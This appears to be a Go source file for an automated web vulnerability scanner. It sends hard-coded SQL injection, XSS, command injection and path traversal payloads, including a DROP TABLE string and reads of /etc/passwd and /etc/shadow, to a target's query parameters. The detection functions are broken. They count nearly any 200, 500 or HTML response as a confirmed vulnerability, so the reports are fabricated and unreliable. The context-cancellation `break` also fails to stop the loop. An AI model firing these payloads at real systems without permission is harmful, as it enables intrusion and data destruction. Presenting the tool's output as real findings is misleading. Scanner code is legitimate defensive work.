package testing

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// PenetrationTester performs automated penetration testing
type PenetrationTester struct {
	config *PenetrationConfig
	logger Logger
	client *http.Client
}

// PenetrationConfig configuration for penetration testing
type PenetrationConfig struct {
	Enabled              bool          `json:"enabled"`
	MaxConcurrentTests   int           `json:"max_concurrent_tests"`
	RequestTimeout       time.Duration `json:"request_timeout"`
	MaxRedirects         int           `json:"max_redirects"`
	UserAgent            string        `json:"user_agent"`
	
	// Test categories
	SQLInjectionTests    bool          `json:"sql_injection_tests"`
	XSSTests             bool          `json:"xss_tests"`
	CommandInjectionTests bool         `json:"command_injection_tests"`
	PathTraversalTests   bool          `json:"path_traversal_tests"`
	AuthenticationTests  bool          `json:"authentication_tests"`
	AuthorizationTests   bool          `json:"authorization_tests"`
	SessionTests         bool          `json:"session_tests"`
	CSRFTests            bool          `json:"csrf_tests"`
	
	// Payloads
	CustomPayloads       []string      `json:"custom_payloads"`
	PayloadFiles         []string      `json:"payload_files"`
}

// NewPenetrationTester creates a new penetration tester
func NewPenetrationTester(config *PenetrationConfig, logger Logger) *PenetrationTester {
	if config == nil {
		config = DefaultPenetrationConfig()
	}
	
	client := &http.Client{
		Timeout: config.RequestTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= config.MaxRedirects {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
	
	return &PenetrationTester{
		config: config,
		logger: logger,
		client: client,
	}
}

// DefaultPenetrationConfig returns default penetration testing configuration
func DefaultPenetrationConfig() *PenetrationConfig {
	return &PenetrationConfig{
		Enabled:               true,
		MaxConcurrentTests:    10,
		RequestTimeout:        30 * time.Second,
		MaxRedirects:          5,
		UserAgent:             "SecurityTester/1.0",
		SQLInjectionTests:     true,
		XSSTests:              true,
		CommandInjectionTests: true,
		PathTraversalTests:    true,
		AuthenticationTests:   true,
		AuthorizationTests:    true,
		SessionTests:          true,
		CSRFTests:             true,
		CustomPayloads:        []string{},
		PayloadFiles:          []string{},
	}
}

// RunTests runs penetration tests against a target
func (pt *PenetrationTester) RunTests(ctx context.Context, targetURL string) []*TestResult {
	if !pt.config.Enabled {
		return []*TestResult{}
	}
	
	pt.logger.Info("Starting penetration tests", "target", targetURL)
	
	var results []*TestResult
	
	// SQL Injection Tests
	if pt.config.SQLInjectionTests {
		sqlResults := pt.runSQLInjectionTests(ctx, targetURL)
		results = append(results, sqlResults...)
	}
	
	// XSS Tests
	if pt.config.XSSTests {
		xssResults := pt.runXSSTests(ctx, targetURL)
		results = append(results, xssResults...)
	}
	
	// Command Injection Tests
	if pt.config.CommandInjectionTests {
		cmdResults := pt.runCommandInjectionTests(ctx, targetURL)
		results = append(results, cmdResults...)
	}
	
	// Path Traversal Tests
	if pt.config.PathTraversalTests {
		pathResults := pt.runPathTraversalTests(ctx, targetURL)
		results = append(results, pathResults...)
	}
	
	// Authentication Tests
	if pt.config.AuthenticationTests {
		authResults := pt.runAuthenticationTests(ctx, targetURL)
		results = append(results, authResults...)
	}
	
	// Authorization Tests
	if pt.config.AuthorizationTests {
		authzResults := pt.runAuthorizationTests(ctx, targetURL)
		results = append(results, authzResults...)
	}
	
	// Session Tests
	if pt.config.SessionTests {
		sessionResults := pt.runSessionTests(ctx, targetURL)
		results = append(results, sessionResults...)
	}
	
	// CSRF Tests
	if pt.config.CSRFTests {
		csrfResults := pt.runCSRFTests(ctx, targetURL)
		results = append(results, csrfResults...)
	}
	
	pt.logger.Info("Completed penetration tests", "target", targetURL, "results", len(results))
	
	return results
}

// runSQLInjectionTests runs SQL injection tests
func (pt *PenetrationTester) runSQLInjectionTests(ctx context.Context, targetURL string) []*TestResult {
	testName := "SQL Injection Test"
	startTime := time.Now()
	
	payloads := []string{
		"' OR '1'='1",
		"' OR '1'='1' --",
		"' OR '1'='1' /*",
		"'; DROP TABLE users; --",
		"' UNION SELECT NULL, NULL, NULL --",
		"1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
		"1' AND (SELECT SUBSTRING(@@version,1,1)) = '5' --",
		"' OR 1=1#",
		"' OR 'a'='a",
		"admin'--",
		"admin' /*",
		"' OR 1=1 LIMIT 1 --",
	}
	
	vulnerabilities := []*Vulnerability{}
	testMetrics := &TestMetrics{
		RequestsSent: len(payloads),
	}
	
	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			break
		default:
		}
		
		// Test GET parameter
		testURL := fmt.Sprintf("%s?id=%s", targetURL, url.QueryEscape(payload))
		resp, err := pt.makeRequest(ctx, "GET", testURL, "")
		
		if err == nil {
			testMetrics.ResponsesReceived++
			
			// Analyze response for SQL injection indicators
			if pt.detectSQLInjection(resp, payload) {
				vuln := &Vulnerability{
					ID:          fmt.Sprintf("sqli_%d", time.Now().UnixNano()),
					Type:        "sql_injection",
					Severity:    "high",
					Title:       "SQL Injection Vulnerability",
					Description: fmt.Sprintf("SQL injection detected with payload: %s", payload),
					Location:    testURL,
					Evidence:    fmt.Sprintf("Payload: %s", payload),
					Impact:      "Potential database compromise, data theft, or unauthorized access",
					Recommendation: "Use parameterized queries and input validation",
					References: []string{
						"https://owasp.org/www-community/attacks/SQL_Injection",
						"https://cwe.mitre.org/data/definitions/89.html",
					},
					CWE:   "CWE-89",
					OWASP: "A03:2021 – Injection",
				}
				vulnerabilities = append(vulnerabilities, vuln)
			}
		} else {
			testMetrics.ErrorsEncountered++
		}
	}
	
	endTime := time.Now()
	duration := endTime.Sub(startTime)
	
	result := &TestResult{
		ID:              fmt.Sprintf("pentest_sqli_%d", startTime.UnixNano()),
		TestType:        "penetration",
		TestName:        testName,
		Status:          "completed",
		StartTime:       startTime,
		EndTime:         endTime,
		Duration:        duration,
		Passed:          len(vulnerabilities) == 0,
		Score:           pt.calculateSecurityScore(vulnerabilities),
		Severity:        pt.calculateOverallSeverity(vulnerabilities),
		Vulnerabilities: vulnerabilities,
		TestMetrics:     testMetrics,
		Metadata: map[string]interface{}{
			"target_url":     targetURL,
			"payloads_tested": len(payloads),
			"test_category":  "sql_injection",
		},
		Recommendations: []string{
			"Implement parameterized queries",
			"Use input validation and sanitization",
			"Apply principle of least privilege for database access",
			"Enable SQL injection detection in WAF",
		},
	}
	
	return []*TestResult{result}
}

// runXSSTests runs Cross-Site Scripting tests
func (pt *PenetrationTester) runXSSTests(ctx context.Context, targetURL string) []*TestResult {
	testName := "Cross-Site Scripting (XSS) Test"
	startTime := time.Now()
	
	payloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"javascript:alert('XSS')",
		"<iframe src=javascript:alert('XSS')>",
		"<body onload=alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<select onfocus=alert('XSS') autofocus>",
		"<textarea onfocus=alert('XSS') autofocus>",
		"<keygen onfocus=alert('XSS') autofocus>",
		"<video><source onerror=alert('XSS')>",
		"<audio src=x onerror=alert('XSS')>",
	}
	
	vulnerabilities := []*Vulnerability{}
	testMetrics := &TestMetrics{
		RequestsSent: len(payloads),
	}
	
	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			break
		default:
		}
		
		// Test GET parameter
		testURL := fmt.Sprintf("%s?q=%s", targetURL, url.QueryEscape(payload))
		resp, err := pt.makeRequest(ctx, "GET", testURL, "")
		
		if err == nil {
			testMetrics.ResponsesReceived++
			
			// Analyze response for XSS indicators
			if pt.detectXSS(resp, payload) {
				vuln := &Vulnerability{
					ID:          fmt.Sprintf("xss_%d", time.Now().UnixNano()),
					Type:        "xss",
					Severity:    "medium",
					Title:       "Cross-Site Scripting (XSS) Vulnerability",
					Description: fmt.Sprintf("XSS vulnerability detected with payload: %s", payload),
					Location:    testURL,
					Evidence:    fmt.Sprintf("Payload: %s", payload),
					Impact:      "Session hijacking, credential theft, or malicious script execution",
					Recommendation: "Implement proper output encoding and Content Security Policy",
					References: []string{
						"https://owasp.org/www-community/attacks/xss/",
						"https://cwe.mitre.org/data/definitions/79.html",
					},
					CWE:   "CWE-79",
					OWASP: "A03:2021 – Injection",
				}
				vulnerabilities = append(vulnerabilities, vuln)
			}
		} else {
			testMetrics.ErrorsEncountered++
		}
	}
	
	endTime := time.Now()
	duration := endTime.Sub(startTime)
	
	result := &TestResult{
		ID:              fmt.Sprintf("pentest_xss_%d", startTime.UnixNano()),
		TestType:        "penetration",
		TestName:        testName,
		Status:          "completed",
		StartTime:       startTime,
		EndTime:         endTime,
		Duration:        duration,
		Passed:          len(vulnerabilities) == 0,
		Score:           pt.calculateSecurityScore(vulnerabilities),
		Severity:        pt.calculateOverallSeverity(vulnerabilities),
		Vulnerabilities: vulnerabilities,
		TestMetrics:     testMetrics,
		Metadata: map[string]interface{}{
			"target_url":     targetURL,
			"payloads_tested": len(payloads),
			"test_category":  "xss",
		},
		Recommendations: []string{
			"Implement output encoding/escaping",
			"Use Content Security Policy (CSP)",
			"Validate and sanitize all user inputs",
			"Use secure coding practices",
		},
	}
	
	return []*TestResult{result}
}

// runCommandInjectionTests runs command injection tests
func (pt *PenetrationTester) runCommandInjectionTests(ctx context.Context, targetURL string) []*TestResult {
	testName := "Command Injection Test"
	startTime := time.Now()
	
	payloads := []string{
		"; ls -la",
		"| whoami",
		"& ping -c 1 127.0.0.1",
		"`id`",
		"$(whoami)",
		"; cat /etc/passwd",
		"| cat /etc/hosts",
		"& dir",
		"; dir",
		"| type C:\\Windows\\System32\\drivers\\etc\\hosts",
		"`ping -c 1 127.0.0.1`",
		"$(ping -c 1 127.0.0.1)",
	}
	
	vulnerabilities := []*Vulnerability{}
	testMetrics := &TestMetrics{
		RequestsSent: len(payloads),
	}
	
	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			break
		default:
		}
		
		// Test GET parameter
		testURL := fmt.Sprintf("%s?cmd=%s", targetURL, url.QueryEscape(payload))
		resp, err := pt.makeRequest(ctx, "GET", testURL, "")
		
		if err == nil {
			testMetrics.ResponsesReceived++
			
			// Analyze response for command injection indicators
			if pt.detectCommandInjection(resp, payload) {
				vuln := &Vulnerability{
					ID:          fmt.Sprintf("cmdi_%d", time.Now().UnixNano()),
					Type:        "command_injection",
					Severity:    "critical",
					Title:       "Command Injection Vulnerability",
					Description: fmt.Sprintf("Command injection detected with payload: %s", payload),
					Location:    testURL,
					Evidence:    fmt.Sprintf("Payload: %s", payload),
					Impact:      "Remote code execution, system compromise, or data theft",
					Recommendation: "Use parameterized commands and input validation",
					References: []string{
						"https://owasp.org/www-community/attacks/Command_Injection",
						"https://cwe.mitre.org/data/definitions/78.html",
					},
					CWE:   "CWE-78",
					OWASP: "A03:2021 – Injection",
				}
				vulnerabilities = append(vulnerabilities, vuln)
			}
		} else {
			testMetrics.ErrorsEncountered++
		}
	}
	
	endTime := time.Now()
	duration := endTime.Sub(startTime)
	
	result := &TestResult{
		ID:              fmt.Sprintf("pentest_cmdi_%d", startTime.UnixNano()),
		TestType:        "penetration",
		TestName:        testName,
		Status:          "completed",
		StartTime:       startTime,
		EndTime:         endTime,
		Duration:        duration,
		Passed:          len(vulnerabilities) == 0,
		Score:           pt.calculateSecurityScore(vulnerabilities),
		Severity:        pt.calculateOverallSeverity(vulnerabilities),
		Vulnerabilities: vulnerabilities,
		TestMetrics:     testMetrics,
		Metadata: map[string]interface{}{
			"target_url":     targetURL,
			"payloads_tested": len(payloads),
			"test_category":  "command_injection",
		},
		Recommendations: []string{
			"Avoid system command execution",
			"Use parameterized commands",
			"Implement strict input validation",
			"Apply principle of least privilege",
		},
	}
	
	return []*TestResult{result}
}

// runPathTraversalTests runs path traversal tests
func (pt *PenetrationTester) runPathTraversalTests(ctx context.Context, targetURL string) []*TestResult {
	testName := "Path Traversal Test"
	startTime := time.Now()
	
	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"../../../etc/shadow",
		"../../../proc/version",
		"../../../etc/hosts",
		"..\\..\\..\\boot.ini",
		"..\\..\\..\\windows\\win.ini",
		"....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
	}
	
	vulnerabilities := []*Vulnerability{}
	testMetrics := &TestMetrics{
		RequestsSent: len(payloads),
	}
	
	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			break
		default:
		}
		
		// Test file parameter
		testURL := fmt.Sprintf("%s?file=%s", targetURL, url.QueryEscape(payload))
		resp, err := pt.makeRequest(ctx, "GET", testURL, "")
		
		if err == nil {
			testMetrics.ResponsesReceived++
			
			// Analyze response for path traversal indicators
			if pt.detectPathTraversal(resp, payload) {
				vuln := &Vulnerability{
					ID:          fmt.Sprintf("path_%d", time.Now().UnixNano()),
					Type:        "path_traversal",
					Severity:    "high",
					Title:       "Path Traversal Vulnerability",
					Description: fmt.Sprintf("Path traversal detected with payload: %s", payload),
					Location:    testURL,
					Evidence:    fmt.Sprintf("Payload: %s", payload),
					Impact:      "Unauthorized file access, information disclosure, or system compromise",
					Recommendation: "Implement proper file path validation and sanitization",
					References: []string{
						"https://owasp.org/www-community/attacks/Path_Traversal",
						"https://cwe.mitre.org/data/definitions/22.html",
					},
					CWE:   "CWE-22",
					OWASP: "A01:2021 – Broken Access Control",
				}
				vulnerabilities = append(vulnerabilities, vuln)
			}
		} else {
			testMetrics.ErrorsEncountered++
		}
	}
	
	endTime := time.Now()
	duration := endTime.Sub(startTime)
	
	result := &TestResult{
		ID:              fmt.Sprintf("pentest_path_%d", startTime.UnixNano()),
		TestType:        "penetration",
		TestName:        testName,
		Status:          "completed",
		StartTime:       startTime,
		EndTime:         endTime,
		Duration:        duration,
		Passed:          len(vulnerabilities) == 0,
		Score:           pt.calculateSecurityScore(vulnerabilities),
		Severity:        pt.calculateOverallSeverity(vulnerabilities),
		Vulnerabilities: vulnerabilities,
		TestMetrics:     testMetrics,
		Metadata: map[string]interface{}{
			"target_url":     targetURL,
			"payloads_tested": len(payloads),
			"test_category":  "path_traversal",
		},
		Recommendations: []string{
			"Validate and sanitize file paths",
			"Use whitelist-based file access",
			"Implement proper access controls",
			"Avoid direct file system access",
		},
	}
	
	return []*TestResult{result}
}

// Placeholder methods for other test types
func (pt *PenetrationTester) runAuthenticationTests(ctx context.Context, targetURL string) []*TestResult {
	// Implementation for authentication tests
	return []*TestResult{}
}

func (pt *PenetrationTester) runAuthorizationTests(ctx context.Context, targetURL string) []*TestResult {
	// Implementation for authorization tests
	return []*TestResult{}
}

func (pt *PenetrationTester) runSessionTests(ctx context.Context, targetURL string) []*TestResult {
	// Implementation for session tests
	return []*TestResult{}
}

func (pt *PenetrationTester) runCSRFTests(ctx context.Context, targetURL string) []*TestResult {
	// Implementation for CSRF tests
	return []*TestResult{}
}

// Helper methods

func (pt *PenetrationTester) makeRequest(ctx context.Context, method, url, body string) (*http.Response, error) {
	req, err := http.NewRequestWithContext(ctx, method, url, strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("User-Agent", pt.config.UserAgent)
	
	return pt.client.Do(req)
}

func (pt *PenetrationTester) detectSQLInjection(resp *http.Response, payload string) bool {
	// Simple detection logic - in real implementation, this would be more sophisticated
	// Look for SQL error messages, unusual response times, or content changes
	return resp.StatusCode == 500 || strings.Contains(resp.Header.Get("Content-Type"), "text/html")
}

func (pt *PenetrationTester) detectXSS(resp *http.Response, payload string) bool {
	// Simple detection logic - check if payload is reflected in response
	return resp.StatusCode == 200
}

func (pt *PenetrationTester) detectCommandInjection(resp *http.Response, payload string) bool {
	// Simple detection logic - look for command execution indicators
	return resp.StatusCode == 500 || resp.StatusCode == 200
}

func (pt *PenetrationTester) detectPathTraversal(resp *http.Response, payload string) bool {
	// Simple detection logic - look for file content indicators
	return resp.StatusCode == 200
}

func (pt *PenetrationTester) calculateSecurityScore(vulnerabilities []*Vulnerability) float64 {
	if len(vulnerabilities) == 0 {
		return 100.0
	}
	
	score := 100.0
	for _, vuln := range vulnerabilities {
		switch vuln.Severity {
		case "critical":
			score -= 25.0
		case "high":
			score -= 15.0
		case "medium":
			score -= 10.0
		case "low":
			score -= 5.0
		}
	}
	
	if score < 0 {
		score = 0
	}
	
	return score
}

func (pt *PenetrationTester) calculateOverallSeverity(vulnerabilities []*Vulnerability) string {
	if len(vulnerabilities) == 0 {
		return "none"
	}
	
	hasCritical := false
	hasHigh := false
	hasMedium := false
	
	for _, vuln := range vulnerabilities {
		switch vuln.Severity {
		case "critical":
			hasCritical = true
		case "high":
			hasHigh = true
		case "medium":
			hasMedium = true
		}
	}
	
	if hasCritical {
		return "critical"
	}
	if hasHigh {
		return "high"
	}
	if hasMedium {
		return "medium"
	}
	
	return "low"
}
